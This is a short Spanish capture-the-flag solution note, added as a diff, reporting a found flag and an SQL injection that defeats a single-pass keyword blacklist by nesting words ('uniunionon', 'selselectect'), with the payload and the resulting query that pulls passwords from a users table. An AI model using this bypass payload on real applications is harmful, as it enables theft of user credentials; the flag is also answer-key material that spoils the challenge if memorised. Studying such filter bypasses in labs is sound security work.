@@ -1,0 +1,17 @@
+FLAG ENCONTRADA:
+==================
+
+WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}
+
+TÉCNICA UTILIZADA:
+- SQL Injection Bypass mediante duplicación de keywords
+- Payload: 1 uniunionon selselectect 1,password frfromom users
+
+EXPLICACIÓN:
+El filtro preg_replace solo elimina las palabras una vez, por lo que:
+- "uniunionon" -> "union" (después del filtro)
+- "selselectect" -> "select" (después del filtro)
+- "frfromom" -> "from" (después del filtro)
+
+Query final ejecutada:
+SELECT id,username FROM users WHERE id=1 union select 1,password from users LIMIT 1
